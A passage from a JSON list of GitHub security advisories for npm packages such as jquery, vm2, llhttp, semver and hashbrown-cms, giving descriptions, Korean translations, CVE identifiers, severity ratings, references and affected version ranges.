    "description": "Cross Site Scripting vulnerability in jQuery v.2.2.0 until v.3.5.0 allows a remote attacker to execute arbitrary code via the `<options>` element.",
    "identifiers": "GHSA : GHSA-257q-pv89-v3xv\nCVE : CVE-2020-23064",
    "severity": "MODERATE",
    "updatedAt": "2023-07-13T20:49:59Z",
    "publishedAt": "2023-06-26T21:30:58Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2020-23064\nhttps://blog.jquery.com/2020/04/10/jquery-3-5-0-released/\nhttps://snyk.io/vuln/SNYK-JS-JQUERY-565129\nhttps://github.com/jquery/jquery/commit/1d61fd9407e6fbe82fe55cb0b938307aa0791f77\nhttps://github.com/rails/jquery-rails/blob/master/CHANGELOG.md#410\nhttps://github.com/rails/jquery-rails/blob/master/CHANGELOG.md#440\nhttps://github.com/rails/jquery-rails/blob/v4.3.5/vendor/assets/javascripts/jquery3.js#L5979\nhttps://github.com/rails/jquery-rails/blob/v4.4.0/vendor/assets/javascripts/jquery3.js#L6162\nhttps://github.com/rubysec/ruby-advisory-db/blob/master/gems/jquery-rails/CVE-2020-23064.yml\nhttps://github.com/advisories/GHSA-257q-pv89-v3xv",
    "name": "jquery",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 1.0.3, < 3.5.0",
    "identifier": "3.5.0",
    "descriptionKR": "jQuery v.2.2.0~v.3.5.0의 교차 사이트 스크립팅 취약성으로 인해 원격 공격자가 `<options>` 요소를 통해 임의의 코드를 실행할 수 있습니다."
  },
  {
    "description": "In Divante vue-storefront-api through 1.11.1 and storefront-api through 1.0-rc.1, as used in VueStorefront PWA, unexpected HTTP requests lead to an exception that discloses the error stack trace, with absolute file paths and Node.js module names.",
    "identifiers": "GHSA : GHSA-9wxj-37p8-49ff\nCVE : CVE-2020-11883",
    "severity": "MODERATE",
    "updatedAt": "2023-07-13T17:45:09Z",
    "publishedAt": "2022-05-24T17:15:44Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2020-11883\nhttps://github.com/DivanteLtd/storefront-api/pull/59\nhttps://github.com/DivanteLtd/vue-storefront-api/pull/431\nhttps://github.com/vuestorefront/storefront-api/pull/59/commits/9165b80c72b469c9615ce2f665499e6f6ead0a6a\nhttps://github.com/vuestorefront/vue-storefront-api/pull/431/commits/965247f41f872e84e4662d04d8e2108eaf6119da\nhttps://github.com/advisories/GHSA-9wxj-37p8-49ff",
    "name": "vue-storefront-api",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 1.12.0",
    "identifier": "1.12.0",
    "descriptionKR": "VueStorefront PWA에서 사용되는 Divante vue-storefront-api ~ 1.11.1 및 storefront-api ~ 1.0-rc.1에서 예기치 않은 HTTP 요청으로 인해 절대 파일 경로 및 Node.js와 함께 오류 스택 추적을 공개하는 예외가 발생합니다. 모듈 이름."
  },
  {
    "description": "In Divante vue-storefront-api through 1.11.1 and storefront-api through 1.0-rc.1, as used in VueStorefront PWA, unexpected HTTP requests lead to an exception that discloses the error stack trace, with absolute file paths and Node.js module names.",
    "identifiers": "GHSA : GHSA-9wxj-37p8-49ff\nCVE : CVE-2020-11883",
    "severity": "MODERATE",
    "updatedAt": "2023-07-13T17:45:09Z",
    "publishedAt": "2022-05-24T17:15:44Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2020-11883\nhttps://github.com/DivanteLtd/storefront-api/pull/59\nhttps://github.com/DivanteLtd/vue-storefront-api/pull/431\nhttps://github.com/vuestorefront/storefront-api/pull/59/commits/9165b80c72b469c9615ce2f665499e6f6ead0a6a\nhttps://github.com/vuestorefront/vue-storefront-api/pull/431/commits/965247f41f872e84e4662d04d8e2108eaf6119da\nhttps://github.com/advisories/GHSA-9wxj-37p8-49ff",
    "name": "storefront-api",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 1.0.0-rc3",
    "identifier": "1.0.0-rc3",
    "descriptionKR": "VueStorefront PWA에서 사용되는 Divante vue-storefront-api ~ 1.11.1 및 storefront-api ~ 1.0-rc.1에서 예기치 않은 HTTP 요청으로 인해 절대 파일 경로 및 Node.js와 함께 오류 스택 추적을 공개하는 예외가 발생합니다. 모듈 이름."
  },
  {
    "description": "An issue was discovered in HashBrown CMS before 1.3.2. `Server/Entity/Resource/Connection.js` allows an attacker to reach a parent directory via a crafted name or ID field.",
    "identifiers": "GHSA : GHSA-q7hx-mrv5-6mrp\nCVE : CVE-2020-5840",
    "severity": "HIGH",
    "updatedAt": "2023-07-13T17:08:05Z",
    "publishedAt": "2022-05-24T17:05:42Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2020-5840\nhttps://github.com/HashBrownCMS/hashbrown-cms/compare/v1.3.1...v1.3.2\nhttps://github.com/HashBrownCMS/hashbrown-cms/releases/tag/v1.3.2\nhttps://github.com/HashBrownCMS/hashbrown-cms/commit/6b37b73944447bb29c6aaeb086b04196d80c692a\nhttps://github.com/advisories/GHSA-q7hx-mrv5-6mrp",
    "name": "hashbrown-cms",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 1.3.2",
    "identifier": "1.3.2",
    "descriptionKR": "1.3.2 이전의 HashBrown CMS에서 문제가 발견되었습니다. 'Server/Entity/Resource/Connection.js'는 공격자가 조작된 이름 또는 ID 필드를 통해 상위 디렉토리에 도달할 수 있도록 합니다."
  },
  {
    "description": "In vm2 for versions up to 3.9.19, `Promise` handler sanitization can be bypassed, allowing attackers to escape the sandbox and run arbitrary code.\n\n### Impact\nRemote Code Execution, assuming the attacker has arbitrary code execution primitive inside the context of vm2 sandbox.\n\n### Patches\nNone.\n\n### Workarounds\nNone.\n\n### References\nPoC is to be disclosed on or after the 5th of September.\n\n### For more information\n\nIf you have any questions or comments about this advisory:\n\n- Open an issue in [VM2](https://github.com/patriksimek/vm2)\n\nThanks to [Xion](https://twitter.com/0x10n) (SeungHyun Lee) of [KAIST Hacking Lab](https://kaist-hacking.github.io/) for disclosing this vulnerability.",
    "identifiers": "GHSA : GHSA-cchq-frgv-rjh5\nCVE : CVE-2023-37466",
    "severity": "CRITICAL",
    "updatedAt": "2023-07-24T20:03:33Z",
    "publishedAt": "2023-07-13T17:02:02Z",
    "references": "https://github.com/patriksimek/vm2/security/advisories/GHSA-cchq-frgv-rjh5\nhttps://nvd.nist.gov/vuln/detail/CVE-2023-37466\nhttps://github.com/advisories/GHSA-cchq-frgv-rjh5",
    "name": "vm2",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "<= 3.9.19",
    "descriptionKR": "버전 3.9.19까지의 vm2에서는 'Promise' 처리기 삭제를 우회하여 공격자가 샌드박스를 벗어나 임의의 코드를 실행할 수 있습니다.\n\n### 영향\n원격 코드 실행(공격자가 vm2 샌드박스 컨텍스트 내에서 임의의 코드 실행 프리미티브를 가지고 있다고 가정).\n\n### 패치\n없음.\n\n### 해결 방법\n없음.\n\n### 참조\nPoC는 9월 5일 이후에 공개될 예정입니다.\n\n### 자세한 내용은\n\n이 권고에 대한 질문이나 의견이 있는 경우:\n\n- [VM2](https://github.com/patriksimek/vm2)에서 이슈 열기\n\n이 취약점을 공개해 주신 [KAIST Hacking Lab](https://kaist-hacking.github.io/)의 [Xion](https://twitter.com/0x10n)(이승현)님께 감사드립니다."
  },
  {
    "description": "In vm2 for versions up to 3.9.19, Node.js custom inspect function allows attackers to escape the sandbox and run arbitrary code.\n\n### Impact\nRemote Code Execution, assuming the attacker has arbitrary code execution primitive inside the context of vm2 sandbox.\n\n### Patches\nNone.\n\n### Workarounds\nNone.\n\n### References\nPoC is to be disclosed on or after the 5th of September.\n\n### Similarity with [CVE-2023-37466](https://nvd.nist.gov/vuln/detail/CVE-2023-37466)\nWhile this advisory might look similar to [CVE-2023-37466](https://nvd.nist.gov/vuln/detail/CVE-2023-37466), it is a completely different way of escaping the sandbox.\n\n### For more information\nIf you have any questions or comments about this advisory:\n\n- Open an issue in [VM2](https://github.com/patriksimek/vm2)\n\nThanks to [Xion](https://twitter.com/0x10n) (SeungHyun Lee) of [KAIST Hacking Lab](https://kaist-hacking.github.io/) for disclosing this vulnerability.",
    "identifiers": "GHSA : GHSA-g644-9gfx-q4q4\nCVE : CVE-2023-37903",
    "severity": "CRITICAL",
    "updatedAt": "2023-07-24T20:03:43Z",
    "publishedAt": "2023-07-13T17:01:58Z",
    "references": "https://github.com/patriksimek/vm2/security/advisories/GHSA-g644-9gfx-q4q4\nhttps://nvd.nist.gov/vuln/detail/CVE-2023-37903\nhttps://github.com/advisories/GHSA-g644-9gfx-q4q4",
    "name": "vm2",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "<= 3.9.19",
    "descriptionKR": "버전 3.9.19까지의 vm2에서 Node.js 사용자 지정 검사 기능을 사용하면 공격자가 샌드박스를 벗어나 임의 코드를 실행할 수 있습니다.\n\n### 영향\n원격 코드 실행(공격자가 vm2 샌드박스 컨텍스트 내에서 임의의 코드 실행 프리미티브를 가지고 있다고 가정).\n\n### 패치\n없음.\n\n### 해결 방법\n없음.\n\n### 참조\nPoC는 9월 5일 이후에 공개될 예정입니다.\n\n### [CVE-2023-37466](https://nvd.nist.gov/vuln/detail/CVE-2023-37466)과의 유사성\n이 권고는 [CVE-2023-37466](https://nvd.nist.gov/vuln/detail/CVE-2023-37466)과 유사해 보일 수 있지만 샌드박스를 탈출하는 완전히 다른 방법입니다.\n\n### 자세한 내용은\n이 권고에 대한 질문이나 의견이 있는 경우:\n\n- [VM2](https://github.com/patriksimek/vm2)에서 이슈 열기\n\n이 취약점을 공개해 주신 [KAIST Hacking Lab](https://kaist-hacking.github.io/)의 [Xion](https://twitter.com/0x10n)(이승현)님께 감사드립니다."
  },
  {
    "description": "The kerberos package before 1.0.0 for Node.js allows arbitrary code execution and privilege escalation via injection of malicious DLLs through use of the kerberos_sspi LoadLibrary() method, because of a DLL path search.",
    "identifiers": "GHSA : GHSA-f478-xwv9-p93q\nCVE : CVE-2020-13110",
    "severity": "HIGH",
    "updatedAt": "2023-07-13T00:12:03Z",
    "publishedAt": "2022-05-24T17:18:00Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2020-13110\nhttps://medium.com/@kiddo_Ha3ker/dll-injection-attack-in-kerberos-npm-package-cb4b32031cd\nhttps://www.npmjs.com/advisories/1514\nhttps://github.com/advisories/GHSA-f478-xwv9-p93q",
    "name": "kerberos",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 1.0.0",
    "identifier": "1.0.0",
    "descriptionKR": "Node.js용 1.0.0 이전의 kerberos 패키지는 DLL 경로 검색으로 인해 kerberos_sspi LoadLibrary() 메서드를 사용하여 악성 DLL 주입을 통한 임의 코드 실행 및 권한 상승을 허용합니다."
  },
  {
    "description": "A remote code execution issue was discovered in HashBrown CMS through 1.3.3. `Server/Entity/Deployer/GitDeployer.js` has a `Service.AppService.exec call` that mishandles the URL, repository, username, and password.",
    "identifiers": "GHSA : GHSA-4gjv-5jjp-rcgh\nCVE : CVE-2020-6948",
    "severity": "CRITICAL",
    "updatedAt": "2023-07-12T20:51:05Z",
    "publishedAt": "2022-05-24T17:06:08Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2020-6948\nhttps://github.com/HashBrownCMS/hashbrown-cms/issues/326\nhttps://github.com/HashBrownCMS/hashbrown-cms/commit/ff95bbad391fb7111355c643cadc02fe8792d758\nhttps://github.com/advisories/GHSA-4gjv-5jjp-rcgh",
    "name": "hashbrown-cms",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "<= 1.3.3",
    "identifier": "1.3.4",
    "descriptionKR": "1.3.3을 통해 HashBrown CMS에서 원격 코드 실행 문제가 발견되었습니다. `Server/Entity/Deployer/GitDeployer.js`에는 URL, 리포지토리, 사용자 이름 및 암호를 잘못 처리하는 `Service.AppService.exec 호출`이 있습니다."
  },
  {
    "description": "### Impact\nVendure is an e-commerce GraphQL framework with a number of APIs and different levels of\nauthorization. By default the Cookie settings are insecure, having the SameSite setting as false\nwhich results in not having one (originates from the cookie-session npm package’s default\nsettings).\n\n### Patches\nIn progress\n\n### Workarounds\nManually set the `authOptions.cookieOptions.sameSite` configuration option to `'strict'`, `'lax'` or `true`.\n\n### References\n_Are there any links users can visit to find out more?_\n",
    "identifiers": "GHSA : GHSA-h9wq-xcqx-mqxm",
    "severity": "LOW",
    "updatedAt": "2023-07-11T22:46:20Z",
    "publishedAt": "2023-07-11T22:46:19Z",
    "references": "https://github.com/vendure-ecommerce/vendure/security/advisories/GHSA-h9wq-xcqx-mqxm\nhttps://github.com/vendure-ecommerce/vendure/commit/4a10d6785a3bf792ddf84053cdf232c205b82c81\nhttps://github.com/advisories/GHSA-h9wq-xcqx-mqxm",
    "name": "@vendure/core",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 2.0.3",
    "identifier": "2.0.3",
    "descriptionKR": "### 영향\nVendure는 전자 상거래 GraphQL 프레임워크로 다양한 API와 다양한 수준의\n권한 부여. 기본적으로 쿠키 설정은 안전하지 않으며 SameSite 설정은 false입니다.\n하나도 없는 결과가 발생합니다(cookie-session npm 패키지의 기본\n설정).\n\n### 패치\n진행 중\n\n### 해결 방법\n`authOptions.cookieOptions.sameSite` 구성 옵션을 `'strict'`, `'lax'` 또는 `true`로 수동 설정합니다.\n\n### 참조\n_사용자가 자세히 알아보기 위해 방문할 수 있는 링크가 있습니까?_"
  },
  {
    "description": "Cross-site Scripting (XSS) - Stored in GitHub repository amauric/tarteaucitron.js prior to v1.13.1.",
    "identifiers": "GHSA : GHSA-f44m-65h3-99vc\nCVE : CVE-2023-3620",
    "severity": "MODERATE",
    "updatedAt": "2023-07-11T22:45:56Z",
    "publishedAt": "2023-07-11T15:31:18Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2023-3620\nhttps://github.com/amauric/tarteaucitron.js/commit/c4c2fcf2b2212ce968bdcae145bb74283c441e5f\nhttps://huntr.dev/bounties/a0fd0671-f051-4d41-8928-9b19819084c9\nhttps://github.com/AmauriC/tarteaucitron.js/releases/tag/v1.13.1\nhttps://github.com/advisories/GHSA-f44m-65h3-99vc",
    "name": "tarteaucitronjs",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 1.13.1",
    "identifier": "1.13.1",
    "descriptionKR": "교차 사이트 스크립팅(XSS) - v1.13.1 이전의 GitHub 저장소 amauric/tarteaucitron.js에 저장되었습니다."
  },
  {
    "description": "The llhttp parser in the http module in Node v20.2.0 does not strictly use the CRLF sequence to delimit HTTP requests. This can lead to HTTP Request Smuggling (HRS).\n\nThe CR character (without LF) is sufficient to delimit HTTP header fields in the llhttp parser. According to RFC7230 section 3, only the CRLF sequence should delimit each header-field. This impacts all Node.js active versions: v16, v18, and, v20\n",
    "identifiers": "GHSA : GHSA-cggh-pq45-6h9x\nCVE : CVE-2023-30589",
    "severity": "HIGH",
    "updatedAt": "2023-08-08T19:12:01Z",
    "publishedAt": "2023-07-01T00:30:46Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2023-30589\nhttps://hackerone.com/reports/2001873\nhttps://github.com/nodejs/llhttp/releases/tag/release%2Fv8.1.1\nhttps://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/VEEQIN5242K5NBE2CZ4DYTNA5B4YTYE5/\nhttps://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/HMEELCREWMRT6NS7HWXLA6XFLLMO36HE/\nhttps://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/UEJWL67XR67JAGEL2ZK22NA3BRKNMZNY/\nhttps://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/VKFMKD4MJZIKFQJAAJ4VZ2FHIJ764A76/\nhttps://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/VCVG4TQRGTK4LKAZKVEQAUEJM7DUACYE/\nhttps://security.netapp.com/advisory/ntap-20230803-0009/\nhttps://github.com/advisories/GHSA-cggh-pq45-6h9x",
    "name": "llhttp",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 8.1.1",
    "identifier": "8.1.1",
    "descriptionKR": "Node v20.2.0의 http 모듈에 있는 llhttp 구문 분석기는 HTTP 요청을 구분하기 위해 CRLF 시퀀스를 엄격하게 사용하지 않습니다. 이로 인해 HRS(HTTP 요청 밀수)가 발생할 수 있습니다.\n\nCR 문자(LF 없음)는 llhttp 구문 분석기에서 HTTP 헤더 필드를 구분하는 데 충분합니다. RFC7230 섹션 3에 따르면 CRLF 시퀀스만 각 헤더 필드를 구분해야 합니다. 이는 모든 Node.js 활성 버전(v16, v18 및 v20)에 영향을 미칩니다."
  },
  {
    "description": "It was discovered that Kibana’s JIRA connector & IBM Resilient connector could be used to return HTTP response data on internal hosts, which may be intentionally hidden from public view. Using this vulnerability, a malicious user with the ability to create connectors, could utilize these connectors to view limited HTTP response data on hosts accessible to the cluster.",
    "identifiers": "GHSA : GHSA-hp5f-qqrw-c8gj\nCVE : CVE-2021-37939",
    "severity": "MODERATE",
    "updatedAt": "2023-07-11T18:24:04Z",
    "publishedAt": "2022-05-24T22:28:42Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2021-37939\nhttps://discuss.elastic.co/t/kibana-7-15-2-security-update/288923\nhttps://github.com/advisories/GHSA-hp5f-qqrw-c8gj",
    "name": "kibana",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 7.8.0, <= 7.15.1",
    "identifier": "7.15.2",
    "descriptionKR": "Kibana의 JIRA 커넥터 및 IBM Resilient 커넥터를 사용하여 공개 보기에서 의도적으로 숨길 수 있는 내부 호스트의 HTTP 응답 데이터를 반환할 수 있음이 발견되었습니다. 이 취약점을 사용하여 커넥터를 만들 수 있는 악의적인 사용자는 이러한 커넥터를 사용하여 클러스터에 액세스할 수 있는 호스트에서 제한된 HTTP 응답 데이터를 볼 수 있습니다."
  },
  {
    "description": "Improperly Controlled Modification of Object Prototype Attributes ('Prototype Pollution') in jquery-plugin-query-object 2.2.3 allows a malicious user to inject properties into Object.prototype.",
    "identifiers": "GHSA : GHSA-q9xg-h756-8689\nCVE : CVE-2021-20083",
    "severity": "HIGH",
    "updatedAt": "2023-07-11T17:00:34Z",
    "publishedAt": "2022-05-24T17:48:43Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2021-20083\nhttps://github.com/BlackFan/client-side-prototype-pollution/blob/master/pp/jquery-query-object.md\nhttps://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/7CR6VGITIB2TXXZ6B5QRRWPU5S4BXQPD/\nhttps://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/IJX6NVXSRN3RX3YUVEJQ4WUTQSDL3DSR/\nhttp://packetstormsecurity.com/files/166299/WordPress-Core-5.9.0-5.9.1-Cross-Site-Scripting.html\nhttps://github.com/advisories/GHSA-q9xg-h756-8689",
    "name": "jquery-query-object",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "<= 2.2.3",
    "descriptionKR": "jquery-plugin-query-object 2.2.3에서 객체 프로토타입 속성의 부적절하게 제어된 수정('프로토타입 오염')으로 인해 악의적인 사용자가 Object.prototype에 속성을 주입할 수 있습니다."
  },
  {
    "description": "### Problem\n\nIt has been discovered that the `ckeditor-wordcount-plugin` plugin for CKEditor4 is susceptible to cross-site scripting when switching to the source code mode.\n\n### Solution\n\nUpdate to version 1.17.12 of the `ckeditor-wordcount-plugin` plugin.\n\n### Credits\n\n* @sypets for reporting this finding to the TYPO3 Security Team\n* @ohader for fixing the issue on behalf of the TYPO3 Security Team\n",
    "identifiers": "GHSA : GHSA-q9w4-w667-qqj4\nCVE : CVE-2023-37905",
    "severity": "MODERATE",
    "updatedAt": "2023-07-21T21:34:16Z",
    "publishedAt": "2023-07-10T21:54:03Z",
    "references": "https://github.com/w8tcha/CKEditor-WordCount-Plugin/security/advisories/GHSA-q9w4-w667-qqj4\nhttps://github.com/w8tcha/CKEditor-WordCount-Plugin/commit/0f03b3e5b7c1409998a13aba3a95396e6fa349d8\nhttps://github.com/w8tcha/CKEditor-WordCount-Plugin/commit/a4b154bdf35b3465320136fcb078f196b437c2f1\nhttps://nvd.nist.gov/vuln/detail/CVE-2023-37905\nhttps://github.com/advisories/GHSA-q9w4-w667-qqj4",
    "name": "ckeditor-wordcount-plugin",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "<= 1.17.11",
    "identifier": "1.17.12",
    "descriptionKR": "### 문제\n\nCKEditor4용 `ckeditor-wordcount-plugin` 플러그인이 소스 코드 모드로 전환할 때 교차 사이트 스크립팅에 취약하다는 것이 발견되었습니다.\n\n### 해결책\n\n`ckeditor-wordcount-plugin` 플러그인 버전 1.17.12로 업데이트합니다.\n\n### 크레딧\n\n* 이 결과를 TYPO3 보안 팀에 보고해 주신 @sypets\n* TYPO3 보안 팀을 대신하여 문제를 해결해 주신 @ohader"
  },
  {
    "description": "SiteServer CMS  v7.x, which SiteServer UI relies on, allows attackers to execute arbitrary code via a crafted plug-in.",
    "identifiers": "GHSA : GHSA-q469-j32f-h7vm\nCVE : CVE-2022-28118",
    "severity": "CRITICAL",
    "updatedAt": "2023-07-11T00:21:34Z",
    "publishedAt": "2022-05-04T00:00:26Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2022-28118\nhttps://github.com/siteserver/cms/issues/3386\nhttps://github.com/Richard-Tang/SSCMS-PluginShell/blob/main/Detail.md\nhttps://github.com/advisories/GHSA-q469-j32f-h7vm",
    "name": "siteserver",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 7.0.0",
    "descriptionKR": "SiteServer UI가 의존하는 SiteServer CMS v7.x는 공격자가 제작된 플러그인을 통해 임의의 코드를 실행할 수 있도록 합니다."
  },
  {
    "description": "The llhttp parser in the http module in Node.js does not strictly use the CRLF sequence to delimit HTTP requests. The LF character (without CR) is sufficient to delimit HTTP header fields in the lihttp parser. According to RFC7230 section 3, only the CRLF sequence should delimit each header-field. This can lead to HTTP Request Smuggling (HRS).",
    "identifiers": "GHSA : GHSA-q5vx-44v4-gch4\nCVE : CVE-2022-32214",
    "severity": "CRITICAL",
    "updatedAt": "2023-07-11T00:18:18Z",
    "publishedAt": "2022-07-15T00:00:18Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2022-32214\nhttps://hackerone.com/reports/1524692\nhttps://nodejs.org/en/blog/vulnerability/july-2022-security-releases/\nhttps://security.netapp.com/advisory/ntap-20220915-0001/\nhttps://www.debian.org/security/2023/dsa-5326\nhttps://github.com/nodejs/llhttp/commit/18a4afc7ffb4e49dc9e2daebc50588199a6d1dbb\nhttps://datatracker.ietf.org/doc/html/rfc7230#section-3\nhttps://github.com/advisories/GHSA-q5vx-44v4-gch4",
    "name": "llhttp",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 6.0.7",
    "identifier": "6.0.7",
    "descriptionKR": "Node.js의 http 모듈에 있는 llhttp 파서는 HTTP 요청을 구분하기 위해 CRLF 시퀀스를 엄격하게 사용하지 않습니다. LF 문자(CR 없음)는 lihttp 구문 분석기에서 HTTP 헤더 필드를 구분하는 데 충분합니다. RFC7230 섹션 3에 따르면 CRLF 시퀀스만 각 헤더 필드를 구분해야 합니다. 이로 인해 HRS(HTTP 요청 밀수)가 발생할 수 있습니다."
  },
  {
    "description": "Versions of the package semver before 7.5.2 on the 7.x branch, before 6.3.1 on the 6.x branch, and all other versions before 5.7.2 are vulnerable to Regular Expression Denial of Service (ReDoS) via the function new Range, when untrusted user data is provided as a range.",
    "identifiers": "GHSA : GHSA-c2qf-rxjj-qqgw\nCVE : CVE-2022-25883",
    "severity": "MODERATE",
    "updatedAt": "2023-07-10T22:57:58Z",
    "publishedAt": "2023-06-21T06:30:28Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2022-25883\nhttps://github.com/npm/node-semver/pull/564\nhttps://github.com/npm/node-semver/commit/717534ee353682f3bcf33e60a8af4292626d4441\nhttps://security.snyk.io/vuln/SNYK-JS-SEMVER-3247795\nhttps://github.com/npm/node-semver/blob/main/classes/range.js#L97-L104\nhttps://github.com/npm/node-semver/blob/main/internal/re.js#L138\nhttps://github.com/npm/node-semver/blob/main/internal/re.js#L160\nhttps://github.com/npm/node-semver/pull/585\nhttps://github.com/npm/node-semver/commit/928e56d21150da0413a3333a3148b20e741a920c\nhttps://github.com/npm/node-semver/pull/593\nhttps://github.com/npm/node-semver/commit/2f8fd41487acf380194579ecb6f8b1bbfe116be0\nhttps://github.com/advisories/GHSA-c2qf-rxjj-qqgw",
    "name": "semver",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 5.7.2",
    "identifier": "5.7.2",
    "descriptionKR": "7.x 브랜치의 7.5.2 이전 버전, 6.x 브랜치의 6.3.1 이전 버전 및 5.7.2 이전의 다른 모든 버전은 new 함수를 통해 정규식 서비스 거부(ReDoS)에 취약합니다. 범위, 신뢰할 수 없는 사용자 데이터가 범위로 ​​제공되는 경우."
  },
  {
    "description": "Versions of the package semver before 7.5.2 on the 7.x branch, before 6.3.1 on the 6.x branch, and all other versions before 5.7.2 are vulnerable to Regular Expression Denial of Service (ReDoS) via the function new Range, when untrusted user data is provided as a range.",
    "identifiers": "GHSA : GHSA-c2qf-rxjj-qqgw\nCVE : CVE-2022-25883",
    "severity": "MODERATE",
    "updatedAt": "2023-07-10T22:57:58Z",
    "publishedAt": "2023-06-21T06:30:28Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2022-25883\nhttps://github.com/npm/node-semver/pull/564\nhttps://github.com/npm/node-semver/commit/717534ee353682f3bcf33e60a8af4292626d4441\nhttps://security.snyk.io/vuln/SNYK-JS-SEMVER-3247795\nhttps://github.com/npm/node-semver/blob/main/classes/range.js#L97-L104\nhttps://github.com/npm/node-semver/blob/main/internal/re.js#L138\nhttps://github.com/npm/node-semver/blob/main/internal/re.js#L160\nhttps://github.com/npm/node-semver/pull/585\nhttps://github.com/npm/node-semver/commit/928e56d21150da0413a3333a3148b20e741a920c\nhttps://github.com/npm/node-semver/pull/593\nhttps://github.com/npm/node-semver/commit/2f8fd41487acf380194579ecb6f8b1bbfe116be0\nhttps://github.com/advisories/GHSA-c2qf-rxjj-qqgw",
    "name": "semver",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 6.0.0, < 6.3.1",
    "identifier": "6.3.1",
    "descriptionKR": "7.x 브랜치의 7.5.2 이전 버전, 6.x 브랜치의 6.3.1 이전 버전 및 5.7.2 이전의 다른 모든 버전은 new 함수를 통해 정규식 서비스 거부(ReDoS)에 취약합니다. 범위, 신뢰할 수 없는 사용자 데이터가 범위로 ​​제공되는 경우."
  },
  {
    "description": "Versions of the package semver before 7.5.2 on the 7.x branch, before 6.3.1 on the 6.x branch, and all other versions before 5.7.2 are vulnerable to Regular Expression Denial of Service (ReDoS) via the function new Range, when untrusted user data is provided as a range.",
    "identifiers": "GHSA : GHSA-c2qf-rxjj-qqgw\nCVE : CVE-2022-25883",
    "severity": "MODERATE",
    "updatedAt": "2023-07-10T22:57:58Z",
    "publishedAt": "2023-06-21T06:30:28Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2022-25883\nhttps://github.com/npm/node-semver/pull/564\nhttps://github.com/npm/node-semver/commit/717534ee353682f3bcf33e60a8af4292626d4441\nhttps://security.snyk.io/vuln/SNYK-JS-SEMVER-3247795\nhttps://github.com/npm/node-semver/blob/main/classes/range.js#L97-L104\nhttps://github.com/npm/node-semver/blob/main/internal/re.js#L138\nhttps://github.com/npm/node-semver/blob/main/internal/re.js#L160\nhttps://github.com/npm/node-semver/pull/585\nhttps://github.com/npm/node-semver/commit/928e56d21150da0413a3333a3148b20e741a920c\nhttps://github.com/npm/node-semver/pull/593\nhttps://github.com/npm/node-semver/commit/2f8fd41487acf380194579ecb6f8b1bbfe116be0\nhttps://github.com/advisories/GHSA-c2qf-rxjj-qqgw",
    "name": "semver",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 7.0.0, < 7.5.2",
    "identifier": "7.5.2",
    "descriptionKR": "7.x 브랜치의 7.5.2 이전 버전, 6.x 브랜치의 6.3.1 이전 버전 및 5.7.2 이전의 다른 모든 버전은 new 함수를 통해 정규식 서비스 거부(ReDoS)에 취약합니다. 범위, 신뢰할 수 없는 사용자 데이터가 범위로 ​​제공되는 경우."
  },
  {
    "description": "The llhttp parser in the http module in Node.js v17.x does not correctly parse and validate Transfer-Encoding headers and can lead to HTTP Request Smuggling (HRS).\n\nImpacts:\n\n- All versions of the nodejs 18.x, 16.x, and 14.x releases lines.\n- llhttp v6.0.7 and llhttp v2.1.5 contains the fixes that were updated inside Node.js",
    "identifiers": "GHSA : GHSA-5689-v88g-g6rv\nCVE : CVE-2022-32213",
    "severity": "CRITICAL",
    "updatedAt": "2023-07-10T21:31:53Z",
    "publishedAt": "2022-07-15T00:00:18Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2022-32213\nhttps://nodejs.org/en/blog/vulnerability/july-2022-security-releases/\nhttps://security.netapp.com/advisory/ntap-20220915-0001/\nhttps://hackerone.com/reports/1524555\nhttps://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/2ICG6CSIB3GUWH5DUSQEVX53MOJW7LYK/\nhttps://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/QCNN3YG2BCLS4ZEKJ3CLSUT6AS7AXTH3/\nhttps://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/VMQK5L5SBYD47QQZ67LEMHNQ662GH3OY/\nhttps://cert-portal.siemens.com/productcert/pdf/ssa-332410.pdf\nhttps://www.debian.org/security/2023/dsa-5326\nhttps://github.com/nodejs/llhttp/commit/18a4afc7ffb4e49dc9e2daebc50588199a6d1dbb\nhttps://github.com/advisories/GHSA-5689-v88g-